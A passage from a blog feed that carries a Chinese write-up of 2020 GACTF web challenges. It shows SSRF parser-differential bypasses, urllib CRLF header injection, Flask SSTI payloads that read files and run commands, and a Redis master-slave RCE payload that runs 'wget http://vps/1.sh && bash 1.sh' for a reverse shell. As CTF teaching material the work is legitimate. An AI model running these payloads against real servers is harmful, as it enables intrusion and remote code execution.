King Of Phish (DC)有关</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;队伍ID：GUTS，web狗个人参赛&lt;/p&gt;
&lt;p&gt;做出的题目&lt;br&gt;&lt;img src=&quot;http://pic.c1imber.top/blog/20201019/96npVIgBXvdn.png?imageslim&quot; alt=&quot;mark&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;web
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020GACTF writeup</title>
    <link href="https://c1aysec.github.io/2020/08/31/2020GACTF%20writeup/"/>
    <id>https://c1aysec.github.io/2020/08/31/2020GACTF writeup/</id>
    <published>2020-08-31T09:59:34.527Z</published>
    <updated>2020-09-02T16:15:25.667Z</updated>
    
    <content type="html"><![CDATA[<h3 id="EZFLASK"><a href="#EZFLASK" class="headerlink" title="EZFLASK"></a>EZFLASK</h3><p><a href="http://124.70.206.91:10001/" target="_blank" rel="external">http://124.70.206.91:10001/</a></p><p><img src="http://pic.c1imber.top/blog/20200831/f0TCWlvCasHb.png?imageslim" alt="mark"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> waf <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> time</div><div class="line">app = Flask(__name__)</div><div class="line"></div><div class="line"><span class="meta">@app.route('/ctfhint')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ctf</span><span class="params">()</span>:</span></div><div class="line">    hint =xxxx <span class="comment"># hints</span></div><div class="line">    trick = xxxx <span class="comment"># trick</span></div><div class="line">    <span class="keyword">return</span> trick</div><div class="line"></div><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># app.txt</span></div><div class="line"><span class="meta">@app.route('/eval', methods=["POST"])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_eval</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># post eval</span></div><div class="line"><span class="meta">@app.route(xxxxxx, methods=["POST"]) # Secret</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># admin requests</span></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">8080</span>)</div></pre></td></tr></table></figure><p>通过代码提示，POST请求/eval路由，得到提示：post eval</p><p><img src="http://pic.c1imber.top/blog/20200831/Duo06XLNNY7S.png?imageslim" alt="mark"></p><p>后端大概是类似于<code>eval(&quot;post eval&quot;)</code>这种，但是过滤了很多内容，过滤的字符有<code>(、）、[、、]、&quot;、&#39;</code>等，并且有长度限制</p><p>可以通过传入eval=ctf.func_code.co_consts获取隐藏路由和提示信息</p><p><img src="http://pic.c1imber.top/blog/20200831/uhLQUt9D3pSI.png?imageslim" alt="mark"></p><p>(None, ‘the admin route :h4rdt0f1nd_9792uagcaca00qjaf<!-- port : 5000 -->‘, ‘too young too simple’)</p><p><a href="https://www.cnblogs.com/xgxzj/archive/2011/09/15/2176240.html" target="_blank" rel="external">https://www.cnblogs.com/xgxzj/archive/2011/09/15/2176240.html</a></p><p>POST请求h4rdt0f1nd_9792uagcaca00qjaf路由</p><p><img src="http://pic.c1imber.top/blog/20200831/HRJiDEFiUVuJ.png?imageslim" alt="mark"></p><p>获得提示，需要传入post ip=x.x.x.x&amp;port=xxxx&amp;path=xxx =&gt; <a href="http://ip:port/path" target="_blank" rel="external">http://ip:port/path</a></p><p>这里存在ssrf，ip参数限制了只能为点分十进制ip地址格式且限制了不能为内网ip，path当中不能出现数字，但是这里用的是python的requests库，默认是支持302跳转</p><p>vps 302跳转php脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">header(<span class="string">"Location: http://127.0.0.1:5000/"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>请求ip=vps&amp;port=&amp;path=/aaa.php，获取源码提示</p><p><img src="http://pic.c1imber.top/blog/20200831/vGLlt0bg3rXy.png?imageslim" alt="mark"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> flask</div><div class="line"><span class="keyword">from</span> xxxx <span class="keyword">import</span> flag</div><div class="line">app = flask.Flask(__name__)</div><div class="line">app.config[<span class="string">'FLAG'</span>] = flag</div><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> open(<span class="string">'app.txt'</span>).read()</div><div class="line"><span class="meta">@app.route('/&lt;path:hack&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span><span class="params">(hack)</span>:</span></div><div class="line">    <span class="keyword">return</span> flask.render_template_string(hack)</div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">5000</span>)</div></pre></td></tr></table></figure><p>存在ssti，获取flag</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">header(<span class="string">"Location: http://127.0.0.1:5000/&#123;&#123;config['FLAG']&#125;&#125;"</span>);</div><div class="line">?&gt;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200831/IBBVu7wFL8QD.png?imageslim" alt="mark"></p><h3 id="sssrfme"><a href="#sssrfme" class="headerlink" title="sssrfme"></a>sssrfme</h3><p><a href="http://121.36.199.21:10801/" target="_blank" rel="external">http://121.36.199.21:10801/</a></p><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// ini_set("display_errors", "On");</span></div><div class="line"><span class="comment">// error_reporting(E_ALL | E_STRICT);</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_url</span><span class="params">($url,$safe)</span> </span>&#123;</div><div class="line">    $parsed = parse_url($url);</div><div class="line">    $validate_ip = <span class="keyword">true</span>;</div><div class="line">    <span class="keyword">if</span>($parsed[<span class="string">'port'</span>]  &amp;&amp; !in_array($parsed[<span class="string">'port'</span>],<span class="keyword">array</span>(<span class="string">'80'</span>,<span class="string">'443'</span>)))&#123;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;b&gt;请求错误:非正常端口,因安全问题只允许抓取80,443端口的链接,如有特殊需求请自行修改程序&lt;/b&gt;"</span>.PHP_EOL;</div><div class="line">        </div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        preg_match(<span class="string">'/^\d+$/'</span>, $parsed[<span class="string">'host'</span>]) &amp;&amp; $parsed[<span class="string">'host'</span>] = long2ip($parsed[<span class="string">'host'</span>]);</div><div class="line">        $long = ip2long($parsed[<span class="string">'host'</span>]);</div><div class="line">        <span class="keyword">if</span>($long===<span class="keyword">false</span>)&#123;</div><div class="line">            $ip = <span class="keyword">null</span>;</div><div class="line">            <span class="keyword">if</span>($safe)&#123;</div><div class="line">                @putenv(<span class="string">'RES_OPTIONS=retrans:1 retry:1 timeout:1 attempts:1'</span>);</div><div class="line">                $ip   = gethostbyname($parsed[<span class="string">'host'</span>]);</div><div class="line">                $long = ip2long($ip);</div><div class="line">                $long===<span class="keyword">false</span> &amp;&amp; $ip = <span class="keyword">null</span>;</div><div class="line">                @putenv(<span class="string">'RES_OPTIONS'</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            $ip = $parsed[<span class="string">'host'</span>];</div><div class="line">        &#125;</div><div class="line">        $ip &amp;&amp; $validate_ip = filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE);<span class="comment">//ip为公网ip返回其ip地址，ip为保留地址或者私有地址时返回false</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(!in_array($parsed[<span class="string">'scheme'</span>],<span class="keyword">array</span>(<span class="string">'http'</span>,<span class="string">'https'</span>)) || !$validate_ip)&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;b&gt;&#123;$url&#125; 请求错误:非正常URL格式,因安全问题只允许抓取 http:// 或 https:// 开头的链接或公有IP地址&lt;/b&gt;"</span>.PHP_EOL;</div><div class="line">        </div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">return</span> $url;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</div><div class="line">    $safe = <span class="keyword">false</span>;</div><div class="line">    <span class="keyword">if</span>(safe_url($url,$safe)) &#123;</div><div class="line">        $ch = curl_init();</div><div class="line">        curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</div><div class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</div><div class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">false</span>);</div><div class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">false</span>);</div><div class="line">        $co = curl_exec($ch);</div><div class="line">        curl_close($ch);</div><div class="line">        <span class="keyword">echo</span> $co;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">highlight_file(<span class="keyword">__FILE__</span>);</div><div class="line">curl($_GET[<span class="string">'url'</span>]);</div></pre></td></tr></table></figure><p>使用<code>parse_url</code>对传入的<code>$_GET[&#39;url&#39;]</code>进行解析，对返回的$parsed进行了检测，通过代码可以看到需要突破的限制如下：</p><p>1、<code>$parsed[&#39;port&#39;]</code>必须为80或443</p><p>2、<code>$parsed[&#39;scheme&#39;]</code>必须为http或https</p><p>3、<code>$parsed[&#39;host&#39;]</code>必须为公网ip</p><p>上面的限制可以通过<code>parse_url</code>和curl的解析差异绕过</p><p>解析差异：</p><p>对于url格式</p><p><code>scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]</code></p><p>当url当中存在@时</p><p><code>parse_url</code>在解析url时,取的host和port为最后一个@字符后符合格式的host和port</p><p>curl在解析url时，取的host和port为第一个@字符后符合格式的host和port</p><p>举个栗子:</p><p>当请求地址<a href="http://u:p@127.0.0.1:1234" target="_blank" rel="external">http://u:p@127.0.0.1:1234</a> @1.1.1.1:80(<strong>注意这里中间位置有一个空格，空格也可以被其它字符代替，可以通过Fuzz获取允许的字符，有的curl版本不需要这个空格</strong>)</p><p>demo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$url=<span class="string">"http://u:p@127.0.0.1:1234 @1.1.1.1:80"</span>;</div><div class="line">$parsed = parse_url($url);</div><div class="line">var_dump($parsed);</div><div class="line">var_dump(ip2long($parsed[<span class="string">'host'</span>]));</div><div class="line">var_dump(filter_var($parsed[<span class="string">'host'</span>], FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE));</div></pre></td></tr></table></figure><p>parse_url的解析结果如下，这里解析到的host和port为1.1.1.1和80</p><p>result:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">array</span>(<span class="number">5</span>) &#123; [<span class="string">"scheme"</span>]=&gt; string(<span class="number">4</span>) <span class="string">"http"</span> [<span class="string">"host"</span>]=&gt; string(<span class="number">7</span>) <span class="string">"1.1.1.1"</span> [<span class="string">"port"</span>]=&gt; int(<span class="number">80</span>) [<span class="string">"user"</span>]=&gt; string(<span class="number">1</span>) <span class="string">"u"</span> [<span class="string">"pass"</span>]=&gt; string(<span class="number">17</span>) <span class="string">"p@127.0.0.1:1234 "</span> &#125;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200831/9JAiUla8pUHy.png?imageslim" alt="mark"></p><p>而curl解析的host和port为127.0.0.1和1234，并且可以看到在curl请求时，空格+@1.1.1.1:80内容被丢弃</p><p><img src="http://pic.c1imber.top/blog/20200831/OoUbbmO5YbeC.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200831/nSrfYQFFGYOF.png?imageslim" alt="mark"></p><p>通过这个特性可以绕过对host和port的限制</p><p>所以目标可以通过以下的请求绕过对ip和端口的限制，对内网ip端口进行探测（题目这里的@1.1.1.1前不需要空格就可以）</p><p><a href="http://121.36.199.21:10801/?url=http://a:b@127.0.0.1:80@1.1.1.1/" target="_blank" rel="external">http://121.36.199.21:10801/?url=http://a:b@127.0.0.1:80@1.1.1.1/</a></p><p><img src="http://pic.c1imber.top/blog/20200831/EbeVoLQEgGgr.png?imageslim" alt="mark"></p><p>（可以看到这里返回了<a href="http://127.0.0.1:80的页面内容）" target="_blank" rel="external">http://127.0.0.1:80的页面内容）</a></p><p>fuzz一下其它可用字符</p><p><img src="http://pic.c1imber.top/blog/20200831/Esh2Nk9AzIf4.png?imageslim" alt="mark"></p><p>得到可用字符有很多</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div></pre></td><td class="code"><pre><div class="line">%a0</div><div class="line">%b0</div><div class="line">%c0</div><div class="line">%d0</div><div class="line">%e0</div><div class="line">%f0</div><div class="line">%a1</div><div class="line">%b1</div><div class="line">%c1</div><div class="line">%d1</div><div class="line">%e1</div><div class="line">%f1</div><div class="line">%a2</div><div class="line">%b2</div><div class="line">%c2</div><div class="line">%d2</div><div class="line">%e2</div><div class="line">%f2</div><div class="line">%a3</div><div class="line">%b3</div><div class="line">%c3</div><div class="line">%d3</div><div class="line">%e3</div><div class="line">%f3</div><div class="line">%a4</div><div class="line">%b4</div><div class="line">%c4</div><div class="line">%d4</div><div class="line">%e4</div><div class="line">%f4</div><div class="line">%a5</div><div class="line">%b5</div><div class="line">%c5</div><div class="line">%d5</div><div class="line">%e5</div><div class="line">%f5</div><div class="line">%a6</div><div class="line">%b6</div><div class="line">%c6</div><div class="line">%d6</div><div class="line">%e6</div><div class="line">%f6</div><div class="line">%a7</div><div class="line">%b7</div><div class="line">%c7</div><div class="line">%d7</div><div class="line">%e7</div><div class="line">%f7</div><div class="line">%a8</div><div class="line">%b8</div><div class="line">%c8</div><div class="line">%d8</div><div class="line">%e8</div><div class="line">%f8</div><div class="line">%a9</div><div class="line">%b9</div><div class="line">%c9</div><div class="line">%d9</div><div class="line">%e9</div><div class="line">%f9</div><div class="line">%aa</div><div class="line">%ba</div><div class="line">%ca</div><div class="line">%da</div><div class="line">%ea</div><div class="line">%fa</div><div class="line">%ab</div><div class="line">%bb</div><div class="line">%cb</div><div class="line">%db</div><div class="line">%eb</div><div class="line">%fb</div><div class="line">%ac</div><div class="line">%bc</div><div class="line">%cc</div><div class="line">%dc</div><div class="line">%ec</div><div class="line">%fc</div><div class="line">%ad</div><div class="line">%bd</div><div class="line">%cd</div><div class="line">%dd</div><div class="line">%ed</div><div class="line">%fd</div><div class="line">%ae</div><div class="line">%be</div><div class="line">%ce</div><div class="line">%de</div><div class="line">%ee</div><div class="line">%fe</div><div class="line">%af</div><div class="line">%bf</div><div class="line">%cf</div><div class="line">%df</div><div class="line">%ef</div><div class="line">%ff</div></pre></td></tr></table></figure><p><strong>注明一下：不同环境下的测试结果会有差别，php有些版本的curl对于这样格式的url会请求失败，或者仅支持很少的字符</strong></p><p>接下来扫描端口，在5000端口得到了提示</p><p><img src="http://pic.c1imber.top/blog/20200831/BJrQDfU8jYs6.png?imageslim" alt="mark"></p><p>hello,world<br>hint: 这是个套娃. <a href="http://localhost:5000/?url=https://baidu.com" target="_blank" rel="external">http://localhost:5000/?url=https://baidu.com</a></p><p>通过探测得知<a href="http://127.0.0.1:5000也存在ssrf，ssrf套ssrf可还行，但是经过测试后发现同样只支持http/https" target="_blank" rel="external">http://127.0.0.1:5000也存在ssrf，ssrf套ssrf可还行，但是经过测试后发现同样只支持http/https</a></p><p>之后通过OOB外带看到这里用的是python的urllib</p><p><img src="http://pic.c1imber.top/blog/20200831/rwinq6vrhblL.png?imageslim" alt="mark"></p><p>这里可以通过urllib的http头注入突破http/https协议的限制，对内网redis进行攻击</p><pre><code>CVE-2016-5699: http://[vps-ip]%0d%0aX-injected:%20header:8888CVE-2019-9740: http://[vps-ip]%0d%0a%0d%0aheaders:8888CVE-2019-9947: http://[vps-ip]:8888?%0d%0apayload%0d%0apadding</code></pre><p>CVE-2019-9947可以成功</p><pre><code>http://121.36.199.21:10801/?url=http://a:b@127.0.0.1:5000@1.1.1.1/?url=http://47.105.186.146:8888?%250D%250Apayload%250D%250Apadding（这里注意需要二次url编码）</code></pre><p>可以看到注入成功</p><p><img src="http://pic.c1imber.top/blog/20200831/J3RUAsO6bn1P.png?imageslim" alt="mark"></p><p>redis存在密码，需要爆破，题目提示弱口令，但是却爆破不出来，均返回-NOAUTH Authentication required.</p><pre><code>http://121.36.199.21:10801/?url=http://a:b@127.0.0.1:5000%20@1.1.1.1/?url=http://127.0.0.1:6379?%250d%250a%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25246%250D%250A123456%250D%250A%252A2%250D%250A%25244%250D%250Akeys%250D%250A%25241%250D%250A*</code></pre><p><img src="http://pic.c1imber.top/blog/20200831/C8D5XO2l5d5D.png?imageslim" alt="mark"></p><p>后来问了队里的师傅，原来因为这里的redis存在安全机制，导致不管输入什么命令都会显示-NOAUTH Authentication required.，所以需要通过redis主从rce爆破密码，反弹shell，密码为123456</p><p>用这个工具可以生成gopher协议的主从rce payload</p><p><a href="https://github.com/xmsec/redis-ssrf" target="_blank" rel="external">https://github.com/xmsec/redis-ssrf</a></p><p>修改成http方式的，payload如下</p><pre><code>http://121.36.199.21:10801/?url=http://a:b@127.0.0.1:5000@1.1.1.1/?url=http://127.0.0.1:6379?%250D%250A%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25246%250D%250A123456%250D%250A%252A3%250D%250A%25247%250D%250ASLAVEOF%250D%250A%252414%250D%250Avps%250D%250A%25244%250D%250A7777%250D%250A%252A4%250D%250A%25246%250D%250ACONFIG%250D%250A%25243%250D%250ASET%250D%250A%25243%250D%250Adir%250D%250A%25245%250D%250A/tmp/%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25246%250D%250Aexp.so%250D%250A%252A3%250D%250A%25246%250D%250AMODULE%250D%250A%25244%250D%250ALOAD%250D%250A%252411%250D%250A/tmp/exp.so%250D%250A%252A2%250D%250A%252411%250D%250Asystem.exec%250D%250A%252444%250D%250Awget%2520http%253A//vps/1.sh%2520%2526%2526%2520bash%25201.sh%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250A</code></pre><p>反弹shell，获取flag（试了好几次才反弹到==）</p><p><img src="http://pic.c1imber.top/blog/20200831/4x1E4jxXir0f.png?imageslim" alt="mark"></p><h2 id="补充几道赛后做的题："><a href="#补充几道赛后做的题：" class="headerlink" title="补充几道赛后做的题："></a>补充几道赛后做的题：</h2><h3 id="simpleflask"><a href="#simpleflask" class="headerlink" title="simpleflask"></a>simpleflask</h3><p><a href="http://124.70.153.63/" target="_blank" rel="external">http://124.70.153.63/</a></p><p>POST访问后提示request.form[“name”]，传入name进行测试，发现存在flask ssti,但是禁用了一些字符，构造以下payload获取flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">"__builtins__"</span>][<span class="string">"open"</span>](<span class="string">"/FLAG"</span>.lower()).read()&#125;&#125;</div></pre></td></tr></table></figure><p>绕过：</p><p><code>(&#39;-&gt;&quot;、/flag-&gt;&quot;/FLAG&quot;.lower())</code></p><p><img src="http://pic.c1imber.top/blog/20200831/qDy2NxPifNAO.png?imageslim" alt="mark"></p><p><strong>题目延申思考</strong></p><p>寻找执行命令的链，寻找os模块</p><p><img src="http://pic.c1imber.top/blog/20200902/l5XkcrMPiYXd.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200902/taD9qKARIjsh.png?imageslim" alt="mark"></p><p>可以找到很多，比如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">304</span>].__init__.__globals__[<span class="string">"OS"</span>.lower()][<span class="string">"POPEN"</span>.lower()](<span class="string">"WHOAMI"</span>.lower()).read()&#125;&#125;</div></pre></td></tr></table></figure><p>再缩短一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">304</span>].__init__.__globals__[<span class="string">"o"</span><span class="string">"s"</span>][<span class="string">"po"</span><span class="string">"pen"</span>](<span class="string">"whoami"</span>).read()&#125;&#125;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200902/FF9xOHjDMVYU.png?imageslim" alt="mark"></p><p>虽然可以执行命令，但是还过滤了空格</p><p>构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">304</span>].__init__.__globals__[<span class="string">"o"</span><span class="string">"s"</span>][<span class="string">"po"</span><span class="string">"pen"</span>](char(<span class="number">32</span>).join(<span class="string">"lsz/"</span>.split(<span class="string">"z"</span>))).read()&#125;&#125;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200902/WkBjq1iCcUSL.png?imageslim" alt="mark"></p><p>但是这里显示char不存在，所以暂时没办法绕过（对flask还不是太熟悉，不知道什么原因）</p><p><strong>关于这道题看了write补充一下：</strong></p><p>看了其他师傅和官方的wp，得知这道题还可以通过任意文件读取+获取pin码进入debug调试模式执行python代码读取flag</p><p>读取题目源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">"__builtins__"</span>][<span class="string">"open"</span>](<span class="string">"/home/ctf/app.py"</span>).read().upper()&#125;&#125;</div></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FROM FLASK IMPORT FLASK, REQUEST, RENDER_TEMPLATE_STRING, REDIRECT, ABORT IMPORT STRING APP = FLASK(__NAME__) WHITE_LIST = STRING.ASCII_LETTERS + STRING.DIGITS + <span class="string">'()_-&#123;&#125;."[]=/'</span> BLACK_LIST = [<span class="string">"CODECS"</span>, <span class="string">"SYSTEM"</span>, <span class="string">"FOR"</span>, <span class="string">"IF"</span>, <span class="string">"END"</span>, <span class="string">"OS"</span>, <span class="string">"EVAL"</span>, <span class="string">"REQUEST"</span>, <span class="string">"WRITE"</span>, <span class="string">"MRO"</span>, <span class="string">"COMPILE"</span>, <span class="string">"EXECFILE"</span>, <span class="string">"EXEC"</span>, <span class="string">"SUBPROCESS"</span>, <span class="string">"IMPORTLIB"</span>, <span class="string">"PLATFORM"</span>, <span class="string">"TIMEIT"</span>, <span class="string">"IMPORT"</span>, <span class="string">"LINECACHE"</span>, <span class="string">"MODULE"</span>, <span class="string">"GETATTRIBUTE"</span>, <span class="string">"POP"</span>, <span class="string">"GETITEM"</span>, <span class="string">"DECODE"</span>, <span class="string">"POPEN"</span>, <span class="string">"IFCONFIG"</span>, <span class="string">"FLAG"</span>, <span class="string">"CONFIG"</span>] DEF CHECK(S): <span class="comment"># PRINT(LEN(S)) IF LEN(S) &gt; 131: ABORT(500, "HACKER") # ABORT(500, "HACKER LEN") FOR I IN S: IF I NOT IN WHITE_LIST: ABORT(500, "HACKER") # ABORT(500, "HACKER WHITE") FOR I IN BLACK_LIST: IF I IN S: ABORT(500, "HACKER") # ABORT(500, "HACKER BLACK") @APP.ROUTE('/', METHODS=["POST"]) DEF HELLO_WORLD(): TRY: NAME = REQUEST.FORM["NAME"] EXCEPT EXCEPTION: RETURN RENDER_TEMPLATE_STRING("&lt;H1&gt;REQUEST.FORM[\"NAME\"]&lt;H1&gt;") IF NAME == "": RETURN RENDER_TEMPLATE_STRING("&lt;H1&gt;HELLO WORLD!&lt;H1&gt;") CHECK(NAME) TEMPLATE = '&lt;H1&gt;HELLO &#123;&#125;!&lt;H1&gt;'.FORMAT(NAME) RES = RENDER_TEMPLATE_STRING(TEMPLATE) IF "FLAG" IN RES: ABORT(500, "HACKER") RETURN RES IF __NAME__ == '__MAIN__': APP.RUN(HOST="0.0.0.0", DEBUG=TRUE) !</span></div></pre></td></tr></table></figure><p>可以看到过滤了哪些东西，并且可以看到这里flask是debug起的</p><p>读取mac地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">"__builtins__"</span>][<span class="string">"open"</span>](<span 